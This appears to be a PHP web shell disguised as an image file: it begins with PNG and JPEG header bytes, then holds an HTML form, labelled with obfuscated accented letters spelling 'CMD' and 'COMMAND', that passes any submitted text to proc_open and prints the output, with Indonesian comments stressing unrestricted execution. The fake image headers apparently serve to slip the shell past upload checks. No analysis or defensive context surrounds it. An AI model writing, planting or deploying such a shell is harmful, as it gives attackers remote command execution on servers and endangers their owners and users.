‰PNG

IHDR  ô      Õæš   sRGB ®Îé    IDATx^ì½ ¼eWY6þœÞn™;%3™™´	é$„ Ò‹` B>APP)Ÿˆ€X@#¨ØåD”À
ÿØÿà JFIF  ` `  ÿþš<!DOCTYPE html>
<html>
<head>
    <title>ČM̃Ď</title>
</head>
<body>
    <center>
    <h1>ČM̃Ď</h1>
    <form method="post">
        <label for="ČŐM̄M̄ĀŃĎ">ČŐM̄M̄ĀŃĎ:</label>
        <input type="text" name="ČŐM̄M̄ĀŃĎ" id="ČŐM̄M̄ĀŃĎ" placeholder="Enter ČŐM̄M̄ĀŃĎ" required>
        <input type="submit" value="Execute">
    </form>
    
    <hr>
    
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        // Mengambil perintah dari input form
        $ČŐM̄M̄ĀŃĎ = $_POST['ČŐM̄M̄ĀŃĎ'];

        // Menggunakan proc_open tanpa batasan untuk mengeksekusi perintah
        $descriptorspec = array(
            0 => array("pipe", "r"),  // stdin
            1 => array("pipe", "w"),  // stdout
            2 => array("pipe", "w")   // stderr
        );
        
        // Eksekusi perintah shell tanpa pembatasan
        $process = proc_open($ČŐM̄M̄ĀŃĎ, $descriptorspec, $pipes);

        if (is_resource($process)) {
            // Membaca output dari stdout dan stderr
            $output = stream_get_contents($pipes[1]);
            $error = stream_get_contents($pipes[2]);
            
            fclose($pipes[1]);
            fclose($pipes[2]);
            
            $return_value = proc_close($process);

            // Menghilangkan tulisan "Output:" dan "Return Code:"
            echo "<pre>$output</pre>";
            if ($error) {
                echo "<pre>$error</pre>";
            }
        }
    }
    ?>
    
    </center>
</body>
</html>
